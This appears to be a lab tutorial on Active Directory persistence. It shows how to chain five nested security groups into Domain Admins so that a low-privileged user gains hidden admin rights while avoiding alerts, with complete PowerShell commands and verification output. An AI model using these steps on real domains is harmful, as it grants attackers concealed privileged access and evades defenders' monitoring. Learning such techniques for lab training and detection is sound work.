# Persistence Through Group Membership in Active Directory

If we don't want to tamper with SID histories, we can add ourselves directly to AD groups for persistence. While SID history is a great persistence technique, credential rotation and cleanup can still remove our persistence. In certain cases, it may be better to perform persistence by targeting the AD groups themselves.

## Why Use Group Membership for Persistence?

As discussed previously, the most privileged account or group is not always the best for persistence. Privileged groups (e.g., **Domain Admins**, **Enterprise Admins**) are monitored more closely for changes. Any group classified as a protected group receives additional security scrutiny. For persistence, it may be more effective to target less obvious groups:

- **IT Support group**: Can reset user passwords, potentially allowing lateral movement.
- **Groups with local administrator rights**: Often less monitored than protected groups, but can provide significant access.
- **Groups with indirect privileges**: For example, those with ownership over Group Policy Objects (GPOs).

## Nested Groups

Most organizations use recursive (nested) groups for structure. For example, the **IT Support** group may contain subgroups like **Helpdesk**, **Access Card Managers**, and **Network Managers**. All users in these subgroups inherit the permissions of the parent group, but can also have more granular permissions.

While nesting helps organize AD, it reduces visibility of effective access. For example, querying the **IT Support** group may only show three members (the subgroups), but the real access includes all users in those subgroups, and potentially their subgroups as well. This complicates both enumeration and monitoring.

### Monitoring Challenges

Alerts may be set up to trigger when a new member is added to a privileged group (e.g., **Domain Admins**), but not when a user is added to a subgroup. This gap can be exploited for persistence by targeting subgroups rather than the main privileged group.

## Leveraging Nested Groups for Persistence

Instead of adding ourselves directly to a privileged group, we can add ourselves to a less-monitored subgroup that is nested within a privileged group.

### Example: Simulating Persistence with Nested Groups

To simulate this, prepend your username to all groups you create. Here’s how to create a chain of nested groups and ultimately gain privileged access:

1. **Create a base group in the IT OU:**
    ```powershell
    New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
    ```

2. **Create another group in the Sales OU and nest the previous group:**
    ```powershell
    New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 
    Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
    ```

3. **Repeat for additional groups:**
    ```powershell
    New-ADGroup -Path "OU=CONSULTING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 3" -SamAccountName "<username>_nestgroup3" -DisplayName "<username> Nest Group 3" -GroupScope Global -GroupCategory Security
    Add-ADGroupMember -Identity "<username>_nestgroup3" -Members "<username>_nestgroup2"

    New-ADGroup -Path "OU=MARKETING,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 4" -SamAccountName "<username>_nestgroup4" -DisplayName "<username> Nest Group 4" -GroupScope Global -GroupCategory Security
    Add-ADGroupMember -Identity "<username>_nestgroup4" -Members "<username>_nestgroup3"

    New-ADGroup -Path "OU=IT,OU=PEOPLE,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 5" -SamAccountName "<username>_nestgroup5" -DisplayName "<username> Nest Group 5" -GroupScope Global -GroupCategory Security
    Add-ADGroupMember -Identity "<username>_nestgroup5" -Members "<username>_nestgroup4"
    ```

4. **Add the last group to the Domain Admins group:**
    ```powershell
    Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
    ```

5. **Add your low-privileged user to the first group:**
    ```powershell
    Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
    ```

### Verifying Access

Your low-privileged user should now have privileged access. For example, using an SSH terminal:

```shell
za\aaron.jones@THMWRK1 C:\Users\aaron.jones> dir \\thmdc.za.tryhackme.loc\c$\
```

You can also verify that only one new member appears in the **Domain Admins** group:

```powershell
Get-ADGroupMember -Identity "Domain Admins"
```

Example output:
```
distinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=loc
name              : Administrator
objectClass       : user
SamAccountName    : Administrator

distinguishedName : CN=Am0 Net Group 5,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc
name              : Am0 Net Group 5
objectClass       : group
SamAccountName    : am0_nestgroup5
```

## Caution

In a real organization, you would use existing groups for nesting rather than creating new ones. Creating unnecessary groups can break the AD structure and cause significant issues, potentially requiring a full rebuild of the AD environment.
